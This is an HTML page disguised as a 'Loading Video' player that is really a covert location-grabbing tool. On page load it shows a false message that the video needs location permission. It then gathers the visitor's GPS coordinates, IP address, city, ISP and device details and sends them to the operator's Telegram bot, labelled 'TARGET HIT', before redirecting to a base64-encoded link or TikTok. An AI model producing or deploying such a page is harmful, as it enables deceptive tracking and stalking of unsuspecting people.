<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p style="margin-left: 15px;">Loading Video...</p>

    <script>
        // GANTI DENGAN DATA LU
        const TOKEN = "ISI_TOKEN_BOTFATHER_LU";
        const CHAT_ID = "ISI_ID_TELE_LU";

        async function sendLog(text) {
            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
            await fetch(url);
        }

        async function getIP() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return `🌐 *IP INFO*\nIP: \`${data.ip}\`\nCity: ${data.city}\nISP: ${data.org}`;
            } catch (e) { return "🌐 IP Info: Failed to fetch"; }
        }

        function getDeviceInfo() {
            return `📱 *DEVICE*\nPlatform: ${navigator.platform}\nAgent: ${navigator.userAgent.slice(0, 50)}...`;
        }

        async function collect() {
            const device = getDeviceInfo();
            const ipData = await getIP();
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        const acc = pos.coords.accuracy;
                        const maps = `https://www.google.com/maps?q=${lat},${lon}`;
                        
                        await sendLog(`🎯 *TARGET HIT! (GPS)*\n\n${device}\n\n${ipData}\n\n📍 *LOCATION*\nLat: \`${lat}\`\nLon: \`${lon}\`\nAccuracy: ${acc}m\n🔗 [Open Maps](${maps})`);
                        redirect();
                    },
                    async (err) => {
                        await sendLog(`⚠️ *TARGET REJECTED GPS*\n\n${device}\n\n${ipData}\n\n*Status:* Tracking via Network only.`);
                        redirect();
                    },
                    { enableHighAccuracy: true }
                );
            }
        }

        function redirect() {
            // Ambil link asli dari URL parameter jika ada, atau default ke TikTok
            const urlParams = new URLSearchParams(window.location.search);
            const rawData = urlParams.get('id');
            const dest = rawData ? atob(rawData) : "https://www.tiktok.com";
            setTimeout(() => { window.location.href = dest; }, 500);
        }

        window.onload = () => {
            alert("This video requires location permission to play in your region.");
            collect();
        };
    </script>
</body>
</html>
